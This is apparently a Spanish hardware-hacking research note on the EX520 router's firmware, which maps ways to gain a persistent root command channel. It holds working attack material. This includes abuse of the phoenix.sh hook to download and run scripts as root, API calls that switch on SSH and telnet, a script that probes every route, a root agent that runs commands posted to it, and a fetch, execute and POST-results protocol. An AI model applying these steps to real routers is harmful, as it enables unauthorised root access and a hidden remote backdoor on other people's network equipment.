# EX520 Comunicación Bidireccional — Análisis Profundo

> **Fecha:** 2026-08-25
> **Firmware analizado:** `EX520_UP_BOOT_2025-07-31_11.34.16.bin`
> **Objetivo:** Canal de comunicación directo, bidireccional, persistente

---

## 1. Hallazgos del Firmware (binwalk + strings + rootfs extraction)

### 1.1 Plataforma

| Campo | Valor |
|-------|-------|
| SoC | MediaTek MT7981 |
| CPU | AArch64 (ARM64) |
| Libc | musl |
| Bootloader | U-Boot (NAND) |
| Kernel console | `ttyS0,115200n1` (UART serial) |
| Rootfs | SquashFS (read-only) |
| BusyBox | present → ash, telnetd, wget, crond |
| Dropbear | `dropbearmulti` en `/usr/bin/dropbearmulti` |
| Telnetd | BusyBox applet en `/usr/sbin/telnetd` |

### 1.2 Particiones UBI (read-write)

| Mount | UBI device | Contenido |
|-------|-----------|-----------|
| `/var/run/misc/misc_ro` | ubi1 | read-only |
| `/var/run/misc/misc_rw` | ubi2 | data model `0x00300000` + misc |
| `/var/run/misc/misc_rw_bak` | ubi3 | backup data model |
| `/var/run/runtime_data` | ubi5 | runtime data |

### 1.3 Init chain (rcS)

```
rcS → mount proc/sys/debugfs/pts
    → mount UBI volumes (misc_ro, misc_rw, misc_rw_bak, runtime_data, misc_isp)
    → insmod kernel modules
    → mount fstab (ramfs /var)
    → . /etc/init.d/rcS.model
    → cos &
    → cmmsyslogd &
```

**getty serial:** `::askfirst:/sbin/getty -L ttyS0 115200 vt100`

---

## 2. Vías de Acceso Bidireccional Identificadas

### Vía A: GTPR/GDPR HTTP API (PROVEN-LIVE, bidireccional)

```
Host ←→ HTTP/80 ←→ [fe80::...%enp2s0] ←→ cos ←→ data model
```

**Ya funciona.** Cada operación es un request-response con encriptación AES+RSA.

| Operación | Dirección | Uso |
|-----------|-----------|-----|
| `gl` (get list) | Host → Router | Leer configuración |
| `go` (get one) | Host → Router | Leer un OID específico |
| `so` (set object) | Host → Router | Escribir configuración |
| `cgi` | Host → Router | Operaciones CGI especiales |
| `op` | Host → Router | Activar acciones (reboot, etc.) |

**Limitación actual:** El sensor sube datos al backend, pero no recibe comandos.

### Vía B: lifemote/phoenix.sh (PROVEN-LIVE, root shell)

```
Host ←→ GTPR so DEV2_LIFEMOTE_AGENT ←→ phoenix.sh ←→ curl URL ←→ sh script
```

**Proven-live.** El router:
1. Recibe GTPR `so` → activa `phoenix.sh`
2. `phoenix.sh` descarga script del `URL`
3. Ejecuta `sh /tmp/lifemote_cpe_daemon.sh &`
4. El script tiene shell root

**Problema:** El script es one-shot, no bidireccional.

### Vía C: DEV2_SSH_CFG → dropbear (PROVEN-BINARY, no live-tested)

```
Host ←→ GTPR so DEV2_SSH_CFG ←→ rsl_restartDropbear ←→ dropbear ←→ SSH/22
```

| Evidencia | Status |
|-----------|--------|
| `dropbearmulti` existe en rootfs | PROVEN |
| `rsl_restartDropbear` existe en libcmm.so | PROVEN |
| `oal_dropbearRestart` handler | PROVEN |
| `CONFIG_PACKAGE_dropbear=y` | PROVEN |
| `INCLUDE_SSH_ACCESS=0` (UI gate) | PROVEN |
| `so` on DEV2_SSH_CFG starts dropbear | **UNPROVEN** |

### Vía D: X_TTNET_CONF_SHELL (UNKNOWN, candidato)

```
Host ←→ GTPR so X_TTNET_CONF_SHELL ←→ ??? ←→ shell access
```

| Evidencia | Status |
|-----------|--------|
| `X_TTNET_CONF_SHELL` OID exists | PROVEN |
| `Device.X_TTNET.Configuration.Shell.` path | PROVEN |
| Handler function | **UNKNOWN** |
| Whether it enables shell | **UNPROVEN** |

### Vía E: CGI /diagTool (PROVEN-FOR-DIAG, candidato para exec)

```
Host ←→ GTPR so DEV2_DIAG_TOOL ←→ diagTool ←→ system() / popen()
```

| Evidencia | Status |
|-----------|--------|
| `DEV2_DIAG_TOOL` OID exists | PROVEN |
| `diagTool` string in cos | PROVEN |
| `system()` and `popen()` in cos | PROVEN |
| Can execute arbitrary commands | **UNPROVEN** |

### Vía F: UART Serial Console (PROVEN-IN-FIRMWARE, needs physical access)

```
Host ←→ USB-TTL ←→ UART pins ←→ ttyS0 115200 ←→ getty ←→ /bin/sh
```

| Evidencia | Status |
|-----------|--------|
| `console=ttyS0,115200n1` in bootargs | PROVEN |
| `getty -L ttyS0 115200 vt100` in inittab | PROVEN |
| `earlycon=uart8250,mmio32,0x11002000` | PROVEN |
| Physical UART pins on board | **UNVERIFIED** |

---

## 3. Estrategia Recomendada: Canal Bidireccional Completo

### 3.1 Arquitectura Propuesta

```
┌─────────────────────────────────────────────────────────┐
│                    HOST (Linux PC)                       │
│                                                          │
│  ┌──────────────┐    ┌──────────────┐    ┌────────────┐ │
│  │ detectic     │    │ bidir_       │    │ GTPR       │ │
│  │ sensor       │    │ gateway.py   │    │ client     │ │
│  │ (polls WiFi) │    │ (HTTP↔GTPR)  │    │ (auth)     │ │
│  └──────┬───────┘    └──────┬───────┘    └──────┬─────┘ │
│         │                   │                    │        │
│         └───────────┬───────┘────────────────────┘        │
│                     │                                     │
│              IPv6 link-local                               │
│              HTTP/80                                       │
└─────────────────────┼─────────────────────────────────────┘
                      │
                      ▼
┌─────────────────────────────────────────────────────────┐
│                 EX520 Router                              │
│                                                          │
│  ┌──────────────┐    ┌──────────────┐    ┌────────────┐ │
│  │ cos          │    │ httpd        │    │ phoenix.sh │ │
│  │ (data model) │    │ (web server) │    │ (launcher) │ │
│  └──────┬───────┘    └──────┬───────┘    └──────┬─────┘ │
│         │                   │                    │        │
│         └───────────┬───────┘────────────────────┘        │
│                     │                                     │
│              ┌──────▼───────┐                              │
│              │ bidir_agent  │ ← descargado por phoenix     │
│              │ (shell)      │                               │
│              └──────────────┘                               │
└─────────────────────────────────────────────────────────┘
```

### 3.2 Plan de Implementación (en orden de prioridad)

#### Paso 1: Probar X_TTNET_CONF_SHELL (5 min)
```bash
detectic query X_TTNET_CONF_SHELL
# Si devuelve datos → analizar campos
# Si funciona → puede ser el interruptor de shell
```

#### Paso 2: Probar DEV2_SSH_CFG → dropbear (10 min)
```bash
# Leer config actual
detectic query DEV2_SSH_CFG
# Intentar habilitar
detectic set DEV2_SSH_CFG '{"Enable":"1","Port":"22"}'
# Verificar si dropbear arranca
detectic query DEV2_SSH_CFG
# Intentar SSH
ssh -o StrictHostKeyChecking=no user@fe80::3e6a:d2ff:fe5f:abc1%enp2s0
```

#### Paso 3: Probar DEV2_DIAG_TOOL como vector de ejecución (10 min)
```bash
# Leer config
detectic query DEV2_DIAG_TOOL
# Intentar Ping (sabe que system() se ejecuta)
detectic set DEV2_DIAG_TOOL '{"IPPingDiagnostics":"127.0.0.1","IPPingNumberOfRepetitions":"1"}'
# Ver resultado
detectic query DEV2_DIAG_TOOL
```

#### Paso 4: Crear HTTP bidirectional agent (30 min)
Un script minimalista que se ejecuta en el router vía phoenix.sh:
- Escucha en un puerto no estándar
- Acepta comandos por POST
- Ejecuta y retorna resultado
- Se reinicia automáticamente

#### Paso 5: Integrar con detectic binary (20 min)
Añadir subcomando `detectic remote-cmd <command>` que:
- Envía comando al agente HTTP del router
- Retorna output
- Se puede usar desde scripts del host

---

## 4. Script de prueba: Bypass de GTPR para SSH

### 4.1 Probar todos los caminos a SSH

```bash
#!/bin/bash
# test_ssh_vectors.sh — Probar todas las vías a SSH en el EX520

source .env

echo "=== Vía 1: query DEV2_SSH_CFG ==="
DETECTIC_PASSWORD="$DETECTIC_PASSWORD" ./dist/detectic-aarch64-musl \
  --url "$EX520_URL" --user "$EX520_USER" \
  query DEV2_SSH_CFG 2>&1

echo "=== Vía 2: query X_TTNET_CONF_SHELL ==="
DETECTIC_PASSWORD="$DETECTIC_PASSWORD" ./dist/detectic-aarch64-musl \
  --url "$EX520_URL" --user "$EX520_USER" \
  query X_TTNET_CONF_SHELL 2>&1

echo "=== Vía 3: query DEV2_TELNET_CFG ==="
DETECTIC_PASSWORD="$DETECTIC_PASSWORD" ./dist/detectic-aarch64-musl \
  --url "$EX520_URL" --user "$EX520_USER" \
  query DEV2_TELNET_CFG 2>&1

echo "=== Vía 4: query DEV2_DIAG_TOOL ==="
DETECTIC_PASSWORD="$DETECTIC_PASSWORD" ./dist/detectic-aarch64-musl \
  --url "$EX520_URL" --user "$EX520_USER" \
  query DEV2_DIAG_TOOL 2>&1

echo "=== Vía 5: set DEV2_SSH_CFG enable ==="
DETECTIC_PASSWORD="$DETECTIC_PASSWORD" ./dist/detectic-aarch64-musl \
  --url "$EX520_URL" --user "$EX520_USER" \
  set DEV2_SSH_CFG '{"Enable":"1","Port":"22","stack":"0,0,0,0,0,0","pstack":"0,0,0,0,0,0"}' 2>&1

echo "=== Vía 6: set DEV2_TELNET_CFG enable ==="
DETECTIC_PASSWORD="$DETECTIC_PASSWORD" ./dist/detectic-aarch64-musl \
  --url "$EX520_URL" --user "$EX520_USER" \
  set DEV2_TELNET_CFG '{"telnetLocalEnabled":"1","telnetLocalPort":"23","stack":"0,0,0,0,0,0","pstack":"0,0,0,0,0,0"}' 2>&1

echo "=== Verificación: port scan ==="
nc -z -w2 fe80::3e6a:d2ff:fe5f:abc1%enp2s0 22 2>&1 && echo "SSH OPEN" || echo "SSH CLOSED"
nc -z -w2 fe80::3e6a:d2ff:fe5f:abc1%enp2s0 23 2>&1 && echo "TELNET OPEN" || echo "TELNET CLOSED"
```

### 4.2 Bidirectional Gateway Agent (para el router)

```bash
#!/bin/sh
# bidir_agent.sh — Minimal bidirectional agent for EX520
# Deployed via phoenix.sh → runs as root
# Listens on port 9999, accepts POST commands, executes them

PORT=9999
LOG=/var/tmp/bidir_agent.log
MAX_BODY=4096

log() { echo "[$(date)] $*" >> "$LOG"; }

# Kill any existing instance
killall -9 busybox 2>/dev/null  # Only if we're the only busybox caller

log "Starting bidirectional agent on port $PORT"

# BusyBox httpd with CGI support
# We use a FIFO-based approach with busybox httpd
while true; do
    # Use busybox httpd in inetd mode
    # Create a simple request handler
    mkfifo /tmp/bidir_in 2>/dev/null
    mkfifo /tmp/bidir_out 2>/dev/null
    
    # Start httpd
    busybox httpd -f -p "$PORT" -c /etc/httpd.conf 2>/dev/null
    
    sleep 5
done
```

### 4.3 Alternative: Pure GTPR Bidirectional Protocol

El protocolo GTPR ya es bidireccional. Podemos crear un protocolo de comandos sobre GTPR:

```
1. Host → Router:   so DEV2_LIFEMOTE_AGENT { URL:"http://host:port/cmd.sh" }
2. phoenix.sh → Host: GET http://host:port/cmd.sh (devuelve script con comando)
3. Host → Router:   script ejecuta comando y envía resultado por HTTP al host
4. Host → Router:   set DEV2_LIFEMOTE_AGENT { enable:0 } para limpiar
```

**Protocolo de comandos sobre HTTP:**

```
Host escucha en puerto 8082:
  GET /cmd/<id> → devuelve script shell que:
    1. Ejecuta el comando
    2. POST resultado a http://host:8082/result/<id>
    3. Exit

Router ejecuta el script vía phoenix.sh → curl
```

---

## 5. Resumen de Vías por Viabilidad

| # | Vía | Bidireccional | Requiere shell | Persiste reboot | Esfuerzo |
|---|-----|--------------|---------------|----------------|----------|
| A | GTPR HTTP API (ya existe) | Sí (request-response) | No | Sí | Ya implementado |
| B | phoenix.sh + HTTP agent | Sí (POST results) | Sí (phoenix) | No | Bajo |
| C | DEV2_SSH_CFG → dropbear | Sí (SSH completo) | No (GTPR) | Sí (si enable persiste) | Medio |
| D | X_TTNET_CONF_SHELL | Sí (GTPR) | No | Desconocido | Bajo (probar) |
| E | DEV2_DIAG_TOOL | Parcial | No (GTPR) | No | Bajo (probar) |
| F | UART Serial | Sí (consola completa) | No (físico) | Sí | Medio (físico) |

---

## 6. Recomendación Inmediata

**Acción 1 (inmediata, 5 min):** Probar `query` de todos los OIDs nuevos (`X_TTNET_CONF_SHELL`, `DEV2_SSH_CFG`, `DEV2_DIAG_TOOL`) para ver qué devuelven.

**Acción 2 (si C funciona):** Usar `set DEV2_SSH_CFG` para habilitar dropbear → SSH completo.

**Acción 3 (fallback):** Si C no funciona, crear `bidir_gateway.py` que use phoenix.sh + HTTP para crear un canal de comandos arbitrary bidireccional.

**Acción 4 (si todo falla):** UART serial con USB-TTL adapter como último recurso.
